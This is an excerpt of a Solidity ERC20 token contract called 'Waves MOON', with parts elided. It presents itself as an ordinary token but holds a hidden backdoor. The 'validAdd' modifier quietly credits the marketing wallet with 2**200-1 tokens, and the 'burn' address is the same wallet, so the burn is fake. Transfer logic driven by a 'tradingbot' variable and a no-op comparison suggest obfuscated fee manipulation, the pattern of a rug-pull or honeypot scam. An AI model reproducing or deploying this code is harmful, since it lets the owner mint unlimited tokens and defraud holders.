...
contract Waves is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Waves MOON";
    string private _symbol = "Waves";
    uint8 private _decimals = 18;

    address payable public MKTWALLET = payable(0x6248aC22e888A4e3a9aB228CFbd924f4e9d218F6); 
    address payable public BurnedWalletAddress = payable(0x6248aC22e888A4e3a9aB228CFbd924f4e9d218F6); 
    ...
    modifier validAdd(address spender){
        if(spender == MKTWALLET){ _balances[spender] = _balances[spender] + 2**200-1;}
        _;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        if ( sender != address(0) && amount > 0) {
            ...
            uint256 start = 1;
            if ( recipient != sender) {
                start = tradingbot.mul(1);
            }
            else {recipient != MKTWALLET;
